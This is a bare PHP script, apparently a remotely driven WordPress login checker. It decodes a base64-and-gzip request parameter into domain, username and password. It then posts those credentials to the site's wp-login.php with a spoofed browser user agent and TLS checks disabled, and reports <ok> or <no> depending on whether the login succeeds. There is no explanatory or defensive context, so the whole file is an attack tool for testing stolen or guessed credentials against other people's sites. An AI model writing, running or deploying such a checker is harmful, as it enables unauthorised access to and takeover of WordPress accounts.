<?php
function getpage($dmn,$username,$password,$url){
if(!preg_match('#http://(.*?)/wp-admin/$#', $url, $re)) {
$ch = curl_init();
curl_setopt ($ch, CURLOPT_URL, $url);
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
curl_setopt ($ch, CURLOPT_HEADER, true);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt ($ch, CURL_COOKIEFILE, '');
curl_setopt ($ch, CURLOPT_REFERER, $url);
$postdata = "log=" . $username . "&pwd=" . $password . "&wp-submit=Log%20In&redirect_to=".$dmn."/wp-admin/&testcookie=1";
curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata);
curl_setopt ($ch, CURLOPT_POST, 1);
$a = curl_exec($ch);
curl_close($ch);
if(preg_match('#Location: (.*)#', $a, $r)) {
$l = trim($r[1]);
return getpage($dmn,$username,$password,$l);}
$rt='<no>'.$url.'</no>';}
else {$rt='<ok>'.$url.'</ok>';}
return $rt;}



$bs=trim(rawurldecode ($_REQUEST['line']));
$line=gzuncompress(base64_decode($bs));
$ln=explode(':',$line);
$dm='http://'.$ln[0];
$user=$ln[1];
$pass=$ln[2];
$urls=$dm.'/wp-login.php';
$res=getpage($dm,$user,$pass,$urls);
echo $res;
?>